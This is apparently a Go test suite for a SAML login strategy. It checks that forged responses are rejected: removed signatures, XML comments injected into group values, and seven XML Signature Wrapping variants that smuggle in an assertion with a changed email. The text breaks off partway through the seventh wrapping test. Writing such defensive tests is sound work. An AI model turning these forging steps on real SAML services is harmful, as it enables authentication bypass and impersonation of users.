package saml_test

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/beevik/etree"
	"github.com/crewjam/saml"

	dsig "github.com/russellhaering/goxmldsig"
	"gotest.tools/assert"
)

type authCodeContainer struct {
	FlowID string          `json:"flow_id"`
	State  string          `json:"state"`
	Traits json.RawMessage `json:"traits"`
}

type ory_kratos_continuity struct{}

func TestHappyPath(t *testing.T) {

	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)
	_ = ids

	// This is the Happy Path, the HTTP response code should be 302 (Found status)
	assert.Check(t, !strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestAddSAMLResponseAttribute(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl

	// Add an attribute to the Response
	responseEl.CreateAttr("newAttr", "randomValue")

	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// This is the Happy Path, the HTTP response code should be 302 (Found status)
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestAddSAMLResponseElement(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl

	// Add an attribute to the Response
	responseEl.CreateElement("newEl")

	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// This is the Happy Path, the HTTP response code should be 302 (Found status)
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestAddSAMLAssertionAttribute(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove the whole Signature element
	RemoveResponseSignature(doc)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Add an attribute to the Response
	decryptedAssertion.CreateAttr("newAttr", "randomValue")

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestAddSAMLAssertionElement(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove the whole Signature element
	RemoveResponseSignature(doc)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Add an attribute to the Response
	decryptedAssertion.CreateElement("newEl")

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// This is the Happy Path, the HTTP response code should be 302 (Found status)
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestRemoveSAMLResponseSignatureValue(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl

	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove SignatureValue element of Signature element
	signatureValueEl := doc.FindElement("//Signature/SignatureValue")
	signatureValueEl.Parent().RemoveChild(signatureValueEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// This is the Happy Path, the HTTP response code should be 302 (Found status)
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestRemoveSAMLResponseSignature(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl

	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove the whole Signature element
	signatureEl := doc.FindElement("//Signature")
	signatureEl.Parent().RemoveChild(signatureEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// This is the Happy Path, the HTTP response code should be 302 (Found status)
	assert.Check(t, !strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestRemoveSAMLAssertionSignatureValue(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove the whole Signature element
	RemoveResponseSignature(doc)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Remove the Signature Value from the decrypted assertion
	signatureValueEl := decryptedAssertion.FindElement("//Signature/SignatureValue")
	signatureValueEl.Parent().RemoveChild(signatureValueEl)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// This is the Happy Path, the HTTP response code should be 302 (Found status)
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestRemoveSAMLAssertionSignature(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove the whole Signature element
	RemoveResponseSignature(doc)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Remove the Signature Value from the decrypted assertion
	signatureEl := decryptedAssertion.FindElement("//Signature")
	signatureEl.Parent().RemoveChild(signatureEl)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// The SAML Assertion signature has been removed but the SAML Response is still signed
	// The SAML Response has been modified, the SAML Response signature is invalid, so there is an error
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestRemoveBothSAMLResponseSignatureAndSAMLAssertionSignatureValue(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove the whole Signature element
	RemoveResponseSignature(doc)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Remove the Signature Value from the decrypted assertion
	assertionSignatureEl := decryptedAssertion.FindElement("//Signature")
	assertionSignatureEl.Parent().RemoveChild(assertionSignatureEl)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestAddXMLCommentsInSAMLAttributes(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	groups := []string{"admin@test.ovh", "not-adminc@test.ovh", "regular@test.ovh", "manager@test.ovh"}
	commentedGroups := []string{"<!--comment-->admin@test.ovh", "not-<!--comment-->adminc@test.ovh", "regular@test.ovh<!--comment-->", "<!--comment-->manager<!--comment-->@test.ovh<!--comment-->"}

	// User session
	userSession := &saml.Session{
		ID:        "f00df00df00d",
		UserEmail: "alice@example.com",
		Groups:    commentedGroups,
	}

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponseWithSession(t, testMiddleware, authnRequest, authnRequestID, userSession)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Remove the whole Signature element
	RemoveResponseSignature(doc)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// Get all identities
	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)
	traitsMap := make(map[string]interface{})
	json.Unmarshal(ids[0].Traits, &traitsMap)

	// Get the groups of the identity
	identityGroups := traitsMap["groups"].([]interface{})

	// We have to check that either the comments are still there, or that they have been deleted by the canonicalizer but that the parser recovers the whole string
	for i := 0; i < len(identityGroups); i++ {
		identityGroup := identityGroups[i].(string)
		if commentedGroups[i] != identityGroup {
			assert.Check(t, groups[i] == identityGroup)
		}
	}
}

// More information about the 9 next tests about XSW attacks:
// https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two

// XSW #1 manipulates SAML Responses.
// It does this by making a copy of the SAML Response and Assertion,
// then inserting the original Signature into the XML as a child element of the copied Response.
// The assumption being that the XML parser finds and uses the copied Response at the top of
// the document after signature validation instead of the original signed Response.
func TestXSW1ResponseWrap1(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	// Remove the whole Signature element of the copied Response Element
	RemoveResponseSignature(originalResponseDoc)

	// Get the original Response Signature element
	evilResponseDoc.FindElement("//Signature").AddChild(originalResponseEl)

	// Modify the ID attribute of the original Response Element
	evilResponseEl.RemoveAttr("ID")
	evilResponseEl.CreateAttr("ID", "id-evil")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

// Similar to XSW #1, XSW #2 manipulates SAML Responses.
// The key difference between #1 and #2 is that the type of Signature used is a detached signature where XSW #1 used an enveloping signature.
// The location of the malicious Response remains the same.
func TestXSW2ResponseWrap2(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	// Remove the whole Signature element of the copied Response Element
	RemoveResponseSignature(originalResponseDoc)

	// We put the orignal response and its signature on the same level, just under the evil reponse
	evilResponseDoc.FindElement("//Response").AddChild(originalResponseEl)
	evilResponseDoc.FindElement("//Response").AddChild(evilResponseDoc.FindElement("//Signature"))

	// Modify the ID attribute of the original Response Element
	evilResponseEl.RemoveAttr("ID")
	evilResponseEl.CreateAttr("ID", "id-evil")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

// XSW #3 is the first example of an XSW that wraps the Assertion element.
// It inserts the copied Assertion as the first child of the root Response element.
// The original Assertion is a sibling of the copied Assertion.
func TestXSW3AssertionWrap1(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	RemoveResponseSignature(evilResponseDoc)

	// We have to delete the signature of the evil assertion
	RemoveAssertionSignature(evilResponseDoc)
	evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
	evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

	evilResponseDoc.FindElement("//Response").AddChild(originalResponseDoc.FindElement("//Assertion"))

	// Change one attribute
	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// Get all identities
	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)

	// We have to check that there is either an error or an identity created without the modified attribute
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
}

// XSW #4 is similar to #3, except in this case the original Assertion becomes a child of the copied Assertion.
func TestXSW4AssertionWrap2(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	RemoveResponseSignature(evilResponseDoc)

	// We have to delete the signature of the evil assertion
	RemoveAssertionSignature(evilResponseDoc)
	evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
	evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

	evilResponseDoc.FindElement("//Assertion").AddChild(originalResponseDoc.FindElement("//Assertion"))

	// Change the username
	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// Get all identities
	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)

	// We have to check that there is either an error or an identity created without the modified attribute
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
}

// XSW #5 is the first instance of Assertion wrapping we see where the Signature and the original Assertion aren’t in one of the three standard configurations (enveloped/enveloping/detached).
// In this case, the copied Assertion envelopes the Signature.
func TestXSW5AssertionWrap3(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	RemoveResponseSignature(evilResponseDoc)

	evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
	evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

	RemoveAssertionSignature(originalResponseDoc)
	evilResponseDoc.FindElement("//Response").AddChild(originalResponseDoc.FindElement("//Assertion"))

	// Change the username
	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// Get all identities
	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)

	// We have to check that there is either an error or an identity created without the modified attribute
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
}

// XSW #6 inserts its copied Assertion into the same location as #’s 4 and 5.
// The interesting piece here is that the copied Assertion envelopes the Signature, which in turn envelopes the original Assertion.
func TestXSW6AssertionWrap4(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	RemoveResponseSignature(evilResponseDoc)

	evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
	evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

	RemoveAssertionSignature(originalResponseDoc)
	evilResponseDoc.FindElement("//Assertion").FindElement("//Signature").AddChild(originalResponseDoc.FindElement("//Assertion"))

	// Change the username
	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// Get all identities
	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)

	// We have to check that there is either an error or an identity created without the modified attribute
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
}

// XSW #7 inserts an Extensions element and adds the copied Assertion as a child. Extensions is a valid XML element with a less restrictive schema definition.
func TestXSW7AssertionWrap5(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	RemoveResponseSignature(evilResponseDoc)

	// We have to delete the signature of the evil assertion
	RemoveAssertionSignature(evilResponseDoc)

	evilResponseDoc.FindElement("//Response").AddChild(etree.NewElement("Extension"))
	evilResponseDoc.FindElement("//Response").FindElement("//Extension").AddChild(evilResponseDoc.FindElement("//Assertion"))
	evilResponseDoc.FindElement("//Response").AddChild(originalResponseDoc.FindElement("//Assertion"))

	// Change the username
	evilResponseDoc.FindElement("//Response/Extension/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// Get all identities
	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)

	// We have to check that there is either an error or an identity created without the modified attribute
